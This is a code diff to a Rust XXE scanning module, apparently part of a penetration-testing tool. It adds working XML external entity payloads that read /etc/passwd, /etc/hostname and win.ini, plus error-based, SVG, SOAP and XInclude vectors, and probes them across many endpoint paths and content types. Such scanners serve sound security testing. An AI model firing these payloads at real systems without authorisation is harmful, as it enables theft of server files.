@@ -1,4 +1,4 @@
-//! XXE Engine — XML endpoint discovery with differential entity-expansion probes.
+//! XXE Engine — XML surface discovery, in-band disclosure, error-based, alternate vectors.
 //! MITRE: T1190 (Exploit Public-Facing Application).
 
 use crate::engine_probes::{empty_ok, finding_with_probe_depth, http_client, normalize_url};
@@ -34,14 +34,15 @@ fn xxe_finding(
     f
 }
 
-async fn http_post_xml(
+async fn http_post_body(
     client: &reqwest::Client,
     url: &str,
+    content_type: &str,
     body: &str,
 ) -> Option<crate::engine_probes::HttpProbe> {
     let resp = client
         .post(url)
-        .header("Content-Type", "application/xml")
+        .header("Content-Type", content_type)
         .body(body.to_string())
         .timeout(Duration::from_secs(8))
         .send()
@@ -69,10 +70,35 @@ async fn http_post_xml(
 }
 
 const XXE_PASSWD: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#;
+const XXE_HOSTNAME: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><r>&xxe;</r>"#;
 const XXE_WININI: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>"#;
+const XXE_ERROR: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "file:///nonexistent-wz-xxe-9137">%xxe;]><r/>"#;
+const XXE_ENTITY_CAP: &str = r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "x"><!ENTITY b "&a;&a;&a;">]><r>&b;</r>"#;
+const XXE_SVG: &str = r#"<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>"#;
+const XXE_SOAP: &str = r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"#;
+const XXE_XINCLUDE: &str = r#"<?xml version="1.0"?><r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></r>"#;
 
-const PASSWD_CANARIES: &[&str] = &["root:x:0:0", "root:*:0:0", "/bin/bash", "/bin/sh"];
+const PASSWD_CANARIES: &[&str] = &["root:x:0:0", "root:*:0:0", "/bin/bash", "/bin/sh", "daemon:"];
+const HOSTNAME_CANARIES: &[&str] = &["localhost", ".local", ".internal"];
 const WININI_CANARIES: &[&str] = &["[fonts]", "[extensions]", "for 16-bit app support"];
+const ERROR_CANARIES: &[&str] = &["file:///", "system cannot find", "no such file", "failed to open", "entity", "external entity"];
+
+const XML_PATHS: &[&str] = &[
+    "/", "/api", "/api/v1", "/xml", "/upload", "/import", "/soap", "/service", "/ws",
+    "/api/import", "/api/xml", "/api/upload", "/rpc", "/wsdl",
+];
+
+const CONTENT_TYPES: &[&str] = &[
+    "application/xml",
+    "text/xml",
+    "application/soap+xml",
+    "image/svg+xml",
+    "application/json",
+];
+
+fn file_disclosed(body: &str, canaries: &[&str], path_marker: &str) -> bool {
+    canaries.iter().any(|c| body.contains(c)) && !body.contains(path_marker)
+}
 
 pub async fn run_xxe_result(target: &str) -> EngineResult {
     if target.trim().is_empty() {
@@ -82,65 +108,88 @@ pub async fn run_xxe_result(target: &str) -> EngineResult {
     let base = normalize_url(target);
     let mut findings: Vec<Value> = Vec::new();
 
-    let xml_paths = [
-        "/",
-        "/api",
-        "/api/v1",
-        "/xml",
-        "/upload",
-        "/import",
-        "/soap",
-        "/service",
-        "/ws",
-        "/api/import",
-        "/api/xml",
-        "/api/upload",
-    ];
-
-    for path in &xml_paths {
+    for path in XML_PATHS {
         let url = format!("{}{}", base.trim_end_matches('/'), path);
-        let ping = http_post_xml(&client, &url, "<ping/>").await;
+        let ping = http_post_body(&client, &url, "application/xml", "<ping/>").await;
         let Some(ping) = ping else { continue };
         if ping.status == 415 || ping.status == 404 {
             continue;
         }
 
-        if let Some(xxe) = http_post_xml(&client, &url, XXE_PASSWD).await {
-            if PASSWD_CANARIES.iter().any(|c| xxe.body.contains(c))
-                && !xxe.body.contains("file:///etc/passwd")
-            {
-                findings.push(xxe_finding(
-                    "XXE: /etc/passwd content in response",
-                    "critical",
-                    &format!(
-                        "POST {} with external entity returned passwd canary (HTTP {}). Arbitrary file read confirmed.",
-                        xxe.final_url, xxe.status
-                    ),
-                    target,
-                    json!({ "path": path, "canary": "passwd" }),
-                ));
-                break;
+        findings.push(xxe_finding(
+            "XML-processing endpoint discovered",
+            "info",
+            &format!(
+                "Endpoint {} accepted XML probe (ping HTTP {} / {} B). External entity processing may be reachable.",
+                url, ping.status, ping.body.len()
+            ),
+            target,
+            json!({ "path": path }),
+        ));
+
+        let probes: &[(&str, &str, &[&str], &str, &str)] = &[
+            (XXE_PASSWD, "critical", PASSWD_CANARIES, "/etc/passwd", "passwd-read"),
+            (XXE_HOSTNAME, "critical", HOSTNAME_CANARIES, "/etc/hostname", "hostname-read"),
+            (XXE_WININI, "critical", WININI_CANARIES, "win.ini", "winini-read"),
+            (XXE_SVG, "high", HOSTNAME_CANARIES, "/etc/hostname", "svg-xxe"),
+            (XXE_SOAP, "high", HOSTNAME_CANARIES, "/etc/hostname", "soap-xxe"),
+            (XXE_XINCLUDE, "high", HOSTNAME_CANARIES, "/etc/hostname", "xinclude-read"),
+        ];
+
+        for (payload, sev, canaries, marker, label) in probes {
+            for ct in CONTENT_TYPES {
+                if let Some(xxe) = http_post_body(&client, &url, ct, payload).await {
+                    if file_disclosed(&xxe.body, canaries, marker) {
+                        findings.push(xxe_finding(
+                            &format!("XXE: {} via {}", label, ct),
+                            sev,
+                            &format!(
+                                "POST {} ({}) with {} payload returned file canary in response (HTTP {}).",
+                                xxe.final_url, ct, label, xxe.status
+                            ),
+                            target,
+                            json!({ "path": path, "content_type": ct, "vector": label }),
+                        ));
+                        break;
+                    }
+                }
             }
         }
 
-        if let Some(xxe) = http_post_xml(&client, &url, XXE_WININI).await {
-            if WININI_CANARIES.iter().any(|c| xxe.body.contains(c)) && !xxe.body.contains("win.ini")
+        if let Some(err) = http_post_body(&client, &url, "application/xml", XXE_ERROR).await {
+            let lc = err.body.to_ascii_lowercase();
+            if ERROR_CANARIES.iter().any(|c| lc.contains(&c.to_ascii_lowercase()))
+                && !err.body.contains("nonexistent-wz-xxe-9137")
             {
                 findings.push(xxe_finding(
-                    "XXE: Windows win.ini content in response",
-                    "critical",
+                    "XXE: error-based parser disclosure",
+                    "high",
                     &format!(
-                        "POST {} with external entity returned win.ini canary (HTTP {}).",
-                        xxe.final_url, xxe.status
+                        "Error-based XXE probe at {} disclosed parser/file path details (HTTP {}).",
+                        err.final_url, err.status
                     ),
                     target,
-                    json!({ "path": path, "canary": "win.ini" }),
+                    json!({ "path": path, "evidence": err.body.chars().take(200).collect::<String>() }),
                 ));
-                break;
             }
         }
 
-        if let Some(xxe) = http_post_xml(&client, &url, XXE_PASSWD).await {
+        if let Some(cap) = http_post_body(&client, &url, "application/xml", XXE_ENTITY_CAP).await {
+            if cap.body.contains("xxx") && !cap.body.contains("<!ENTITY") {
+                findings.push(xxe_finding(
+                    "XXE: internal entity expansion enabled",
+                    "medium",
+                    &format!(
+                        "Bounded internal entity expansion was processed at {} (HTTP {}). External entities may also be enabled.",
+                        cap.final_url, cap.status
+                    ),
+                    target,
+                    json!({ "path": path }),
+                ));
+            }
+        }
+
+        if let Some(xxe) = http_post_body(&client, &url, "application/xml", XXE_PASSWD).await {
             let delta = (xxe.body.len() as i64 - ping.body.len() as i64).abs();
             if delta > 48
                 && xxe.status != ping.status
@@ -148,17 +197,20 @@ pub async fn run_xxe_result(target: &str) -> EngineResult {
                 && !xxe.body.contains("&xxe;")
             {
                 findings.push(xxe_finding(
-                    "XXE: differential response to entity expansion",
+                    "XXE: differential response to entity probe",
                     "high",
                     &format!(
-                        "XML endpoint {} changed response (ping HTTP {} / {} B → XXE HTTP {} / {} B) without echoing the payload — blind XXE candidate.",
+                        "XML endpoint {} changed response (ping HTTP {} / {} B → XXE HTTP {} / {} B) without echoing payload — blind XXE candidate. Pair with OAST engine for OOB confirmation.",
                         url, ping.status, ping.body.len(), xxe.status, xxe.body.len()
                     ),
                     target,
                     json!({ "path": path }),
                 ));
-                break;
             }
+        }
+
+        if findings.iter().any(|f| f.get("severity").and_then(|s| s.as_str()) == Some("critical")) {
+            break;
         }
     }
 
@@ -172,4 +224,15 @@ pub async fn run_xxe_result(target: &str) -> EngineResult {
 
 pub async fn run_xxe(target: &str) {
     print_result(run_xxe_result(target).await);
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn file_disclosed_detects_passwd() {
+        assert!(file_disclosed("root:x:0:0:root", PASSWD_CANARIES, "/etc/passwd"));
+        assert!(!file_disclosed("file:///etc/passwd", PASSWD_CANARIES, "/etc/passwd"));
+    }
 }
